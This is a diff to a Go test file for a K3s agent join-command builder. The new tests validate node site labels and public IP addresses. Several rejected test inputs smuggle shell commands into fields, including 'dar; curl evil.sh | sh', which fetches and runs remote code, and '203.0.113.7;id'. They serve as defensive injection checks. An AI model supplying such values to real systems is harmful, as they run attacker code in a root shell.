@@ -90,7 +90,7 @@ func TestAServerAddressCannotBeUnsafe(t *testing.T) {
 // The command has to be the one K3s actually documents, or it fails on a
 // machine somebody has already gone to the trouble of provisioning.
 func TestTheCommandJoinsAnAgentAndLabelsIt(t *testing.T) {
-	got := BuildCommand("https://10.0.0.1:6443", "K10secret::server:pw", "web")
+	got := BuildCommand("https://10.0.0.1:6443", "K10secret::server:pw", Machine{Pool: "web"})
 
 	for _, want := range []string{
 		"curl -sfL https://get.k3s.io",
@@ -112,8 +112,64 @@ func TestTheCommandJoinsAnAgentAndLabelsIt(t *testing.T) {
 
 // No pool is a normal node, not a node labelled with the empty string.
 func TestNoPoolMeansNoLabel(t *testing.T) {
-	if got := BuildCommand("https://10.0.0.1:6443", "t", ""); strings.Contains(got, "node-label") {
+	if got := BuildCommand("https://10.0.0.1:6443", "t", Machine{}); strings.Contains(got, "node-label") {
 		t.Errorf("a node with no pool was given a label:\n%s", got)
+	}
+}
+
+// A site rides in the same root shell as a pool, so it is held to the same
+// rule, and a public address has to be an address and nothing more.
+func TestASiteOrAddressCannotEndTheCommand(t *testing.T) {
+	for _, tc := range []struct {
+		name string
+		m    Machine
+		ok   bool
+	}{
+		{"site", Machine{Site: "dar-a"}, true},
+		{"ipv4", Machine{PublicIP: "203.0.113.7"}, true},
+		{"ipv6", Machine{PublicIP: "2001:db8::7"}, true},
+		{"everything", Machine{Pool: "web", Site: "dar-b", PublicIP: "198.51.100.2"}, true},
+
+		{"site with a command", Machine{Site: "dar; curl evil.sh | sh"}, false},
+		{"uppercase site", Machine{Site: "DAR-A"}, false},
+		{"address with a command", Machine{PublicIP: "203.0.113.7;id"}, false},
+		{"address with a flag", Machine{PublicIP: "203.0.113.7 --token x"}, false},
+		{"hostname", Machine{PublicIP: "node.example.com"}, false},
+		{"leading zeros", Machine{PublicIP: "203.0.113.007"}, false},
+		{"zoned", Machine{PublicIP: "fe80::1%eth0"}, false},
+		{"not shortest form", Machine{PublicIP: "2001:db8:0::7"}, false},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			err := tc.m.Validate()
+			if tc.ok && err != nil {
+				t.Fatalf("Validate(%+v) = %v, want accepted", tc.m, err)
+			}
+			if !tc.ok && err == nil {
+				t.Fatalf("Validate(%+v) was accepted — it would run in a root shell", tc.m)
+			}
+		})
+	}
+}
+
+// A site is the zone label the scheduler spreads by, and a public address is
+// what the agent's WireGuard peers dial. Both are the agent's own arguments.
+func TestTheCommandCarriesTheSiteAndPublicAddress(t *testing.T) {
+	got := BuildCommand("https://203.0.113.1:6443", "t",
+		Machine{Site: "dar-b", PublicIP: "198.51.100.2"})
+
+	for _, want := range []string{
+		"--node-label topology.kubernetes.io/zone=dar-b",
+		"--node-external-ip 198.51.100.2",
+	} {
+		if !strings.Contains(got, want) {
+			t.Errorf("command is missing %q:\n%s", want, got)
+		}
+		if strings.Index(got, "sh -s -") > strings.Index(got, want) {
+			t.Errorf("%q is not passed to the agent:\n%s", want, got)
+		}
+	}
+	if got := BuildCommand("https://10.0.0.1:6443", "t", Machine{}); strings.Contains(got, "external-ip") {
+		t.Errorf("a machine with no public address was given one:\n%s", got)
 	}
 }
 
@@ -186,7 +242,7 @@ func TestTheStoredTokenIsNotReadable(t *testing.T) {
 	}
 
 	// And it still comes back out, so sealing is not merely mangling it.
-	cmd, err := j.Command(ctx, "web")
+	cmd, err := j.Command(ctx, Machine{Pool: "web"})
 	if err != nil {
 		t.Fatalf("command: %v", err)
 	}
@@ -237,7 +293,7 @@ func TestThereCanOnlyBeOneJoinRow(t *testing.T) {
 	if s.ServerURL != "https://10.0.0.2:6443" {
 		t.Fatalf("server address is %q, want the one stored second", s.ServerURL)
 	}
-	cmd, err := j.Command(ctx, "")
+	cmd, err := j.Command(ctx, Machine{})
 	if err != nil {
 		t.Fatalf("command: %v", err)
 	}
@@ -253,7 +309,7 @@ func TestNoSettingsIsItsOwnAnswer(t *testing.T) {
 	if _, err := j.Settings(context.Background()); err != ErrNotConfigured {
 		t.Fatalf("Settings error = %v, want ErrNotConfigured", err)
 	}
-	if _, err := j.Command(context.Background(), "web"); err != ErrNotConfigured {
+	if _, err := j.Command(context.Background(), Machine{Pool: "web"}); err != ErrNotConfigured {
 		t.Fatalf("Command error = %v, want ErrNotConfigured", err)
 	}
 }
